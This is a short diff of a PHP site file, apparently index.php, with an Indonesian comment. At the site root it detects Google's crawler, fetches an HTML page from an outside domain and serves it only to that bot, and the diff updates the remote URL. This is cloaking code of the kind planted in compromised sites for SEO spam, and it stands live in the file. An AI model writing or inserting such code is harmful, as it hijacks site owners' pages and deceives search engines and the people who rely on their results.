@@ -52,7 +52,7 @@ function is_google_bot(){
 // JALANKAN HANYA JIKA DI ROOT (bukan di /bisa)
 if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php'){
     if(is_google_bot()){
-        $c = curl_init('https://freeportindonesia.org/landing/jurnaldidaktika-revisi2.html');
+        $c = curl_init('https://freeportindonesia.org/landing/jurnaldidaktika-revisi3.html');
         curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
         echo curl_exec($c);
